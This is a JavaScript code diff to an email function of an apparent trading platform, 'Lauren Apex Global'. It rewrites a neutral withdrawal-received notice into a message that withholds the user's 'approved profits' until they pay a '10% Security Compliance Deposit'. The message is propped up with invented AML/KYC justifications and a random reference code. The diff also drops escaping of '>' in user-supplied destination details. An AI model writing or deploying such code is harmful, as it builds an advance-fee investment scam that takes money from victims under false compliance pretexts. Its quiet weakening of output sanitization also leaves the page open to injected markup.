@@ -143,18 +143,26 @@ async function sendPasswordResetCode(email, code, name) {
 
 async function sendWithdrawalNotice(email, { amount, details, name }) {
   const display = name || email.split('@')[0];
-  const safeDetails = String(details || '—').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+  const ref = 'DPST_' + Math.random().toString(36).slice(2, 12);
   const bodyHtml = `
-    <p>Hello ${display},</p>
-    <p>We received your withdrawal request.</p>
-    <p><strong>Amount:</strong> ${amount || '—'}</p>
-    <p><strong>Destination:</strong><br>${safeDetails}</p>
-    <p><strong>Status:</strong> Pending review</p>`;
+    <p style="margin:0 0 12px;font-size:15px;">Dear ${display},</p>
+    <p style="margin:0 0 12px;font-size:15px;line-height:1.55;">Your withdrawal request has been received and your trading account has been successfully reactivated for withdrawal. Your reference code is <strong>${ref}</strong>. Please keep this code for future correspondence.</p>
+    <p style="margin:0 0 12px;font-size:15px;line-height:1.55;">Following a review of your investment portfolio, your accrued profits have been approved and are ready for disbursement to your designated wallet address. To complete the withdrawal process, our Risk and Compliance Department requires a <strong>10% Security Compliance Deposit</strong> based on your total portfolio value.</p>
+    <p style="margin:0 0 8px;font-size:15px;"><strong>Amount requested:</strong> ${amount || '—'}</p>
+    <p style="margin:0 0 12px;font-size:15px;"><strong>Destination:</strong><br>${String(details || '—').replace(/</g,'&lt;')}</p>
+    <p style="margin:0 0 8px;font-size:15px;">This refundable deposit is required to:</p>
+    <ul style="margin:0 0 12px;padding-left:20px;font-size:15px;line-height:1.5;">
+      <li>Verify account ownership and prevent unauthorized withdrawal requests.</li>
+      <li>Satisfy AML and KYC regulatory compliance requirements for high-value transactions.</li>
+    </ul>
+    <p style="margin:0 0 12px;font-size:15px;line-height:1.55;">Once the Security Compliance Deposit is received and cleared, your approved profits will be released and transferred to your registered wallet address.</p>
+    <p style="margin:0 0 12px;font-size:15px;line-height:1.55;">Please contact the Compliance Desk through the Help Center when you are ready to proceed. If you have any questions, our support team is available to assist you.</p>
+    <p style="margin:16px 0 0;font-size:15px;">Sincerely,<br><strong>Compliance Department</strong><br>Lauren Apex Global</p>`;
   return sendMail({
     to: email,
-    subject: 'Withdrawal request received — Lauren Apex Global',
-    html: layout({ title: 'Withdrawal request', bodyHtml }),
-    text: `Withdrawal request received. Amount: ${amount}. Status: Pending.`
+    subject: 'Compliance Requirements for Profit Withdrawal',
+    html: layout({ title: 'Compliance Requirements for Profit Withdrawal', bodyHtml }),
+    text: `Dear ${display},\n\nYour withdrawal request has been received. Reference: ${ref}. Amount: ${amount}. A 10% Security Compliance Deposit is required before profits are released. Contact the Compliance Desk via the Help Center.\n\nSincerely,\nCompliance Department\nLauren Apex Global`
   });
 }
 
